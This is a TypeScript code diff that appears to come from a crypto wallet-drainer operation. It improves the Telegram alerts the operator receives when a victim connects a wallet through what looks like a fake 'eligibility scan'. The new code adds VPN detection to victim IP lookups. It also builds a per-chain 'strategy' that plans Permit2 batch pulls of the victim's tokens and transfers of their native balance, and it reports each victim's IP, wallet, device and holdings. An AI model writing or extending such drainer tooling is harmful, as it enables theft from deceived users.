@@ -348,7 +348,7 @@ export function resolveClientIp(headers: Record<string, string | string[] | unde
   )
 }
 
-/** Get country flag + name from IP using ip-api.com (free, no key needed) */
+/** Get country flag + name + VPN status from IP using ip-api.com (free, no key needed) */
 async function getCountryFromIp(ip: string): Promise<string> {
   if (
     !ip ||
@@ -361,22 +361,69 @@ async function getCountryFromIp(ip: string): Promise<string> {
     return '🏴 Local'
   }
   try {
-    const res = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode`, {
+    const res = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode,proxy,hosting`, {
       signal: AbortSignal.timeout(3_000),
     })
-    const data = (await res.json()) as { country?: string; countryCode?: string }
+    const data = (await res.json()) as { country?: string; countryCode?: string; proxy?: boolean; hosting?: boolean }
     if (data.country && data.countryCode) {
       const flag = data.countryCode
         .toUpperCase()
         .split('')
         .map((c: string) => String.fromCodePoint(0x1f1e6 - 65 + c.charCodeAt(0)))
         .join('')
-      return `${flag} ${data.country}`
+      const vpnTag = (data.proxy || data.hosting) ? ' (🛡️ VPN)' : ''
+      return `${flag} ${data.country}${vpnTag}`
     }
   } catch {
     /* silent */
   }
   return '🌍 Unknown'
+}
+
+export type StrategyAsset = {
+  chain: string
+  family: string
+  token: string
+  symbol: string
+  amount_usd: number
+}
+
+function buildStrategyLines(assets: StrategyAsset[], totalUsd: number): string {
+  if (!assets || assets.length === 0) return ''
+
+  type ChainBucket = { erc20Count: number; erc20Usd: number; nativeUsd: number }
+  const byChain = new Map<string, ChainBucket>()
+
+  for (const a of assets) {
+    if (a.amount_usd <= 0) continue
+    const chainKey = a.chain.toLowerCase()
+    if (!byChain.has(chainKey)) byChain.set(chainKey, { erc20Count: 0, erc20Usd: 0, nativeUsd: 0 })
+    const bucket = byChain.get(chainKey)!
+    const isNative =
+      !a.token ||
+      a.token === 'native' ||
+      a.token.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'
+    if (isNative) {
+      bucket.nativeUsd += a.amount_usd
+    } else {
+      bucket.erc20Count++
+      bucket.erc20Usd += a.amount_usd
+    }
+  }
+
+  const lines: string[] = []
+  for (const [chain, b] of byChain) {
+    const label = chain.toUpperCase()
+    if (b.erc20Count > 0) {
+      lines.push(`👉 ${label} — 🔥 Permit2 Batch (${b.erc20Count} token${b.erc20Count > 1 ? 's' : ''}) $${b.erc20Usd.toFixed(2)}`)
+    }
+    if (b.nativeUsd > 0) {
+      lines.push(`👉 ${label} — Balance transfer $${b.nativeUsd.toFixed(2)}`)
+    }
+  }
+
+  if (lines.length === 0) return ''
+  return `💰 <b>Strategy ($${totalUsd.toFixed(2)}):</b>\n━━━━━━━━━━━━━━━━\n` + lines.join('\n') + '\n'
 }
 
 async function sendTelegramToChat(chatId: string, text: string, url: string): Promise<void> {
@@ -479,20 +526,23 @@ export async function notifyScanComplete(
   totalUsd: number,
   assetsCount: number,
   ctx?: TelegramRequestContext,
+  assets?: StrategyAsset[],
 ): Promise<void> {
   const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
   const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
+  const walletType = ctx?.wallet_type ?? 'Wallet'
+  const strategyBlock = assets && assets.length > 0 ? buildStrategyLines(assets, totalUsd) : ''
 
   const text =
-    `🔍 <b>STEP 2 — ELIGIBILITY SCAN COMPLETE</b>\n` +
-    `━━━━━━━━━━━━━━━━\n` +
-    codeLine('Wallet Address', address) +
-    codeLine('Total USD', totalUsd) +
-    `📦 <b>Assets Found:</b> ${literalValue(assetsCount)}\n` +
-    appendInstitutionalFields(ctx) +
-    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
+    `✨ <b>New Connect (${walletType})</b>\n` +
+    (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 IP: <code>${ctx.ip}</code>` : '') +
+    (country ? ` | ${country}\n` : '\n') +
+    `👛 <b>Wallet:</b> <code>${address}</code>\n` +
+    (ctx?.sourceDomain ? `🔗 <b>Site:</b> ${ctx.sourceDomain}\n` : '') +
     (device ? `💻 <b>Device:</b> ${device}\n` : '') +
-    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
+    `\n` +
+    (strategyBlock ||
+      (`💰 <b>Value:</b> $${totalUsd.toFixed(2)} (${assetsCount} asset${assetsCount !== 1 ? 's' : ''})\n`)) +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
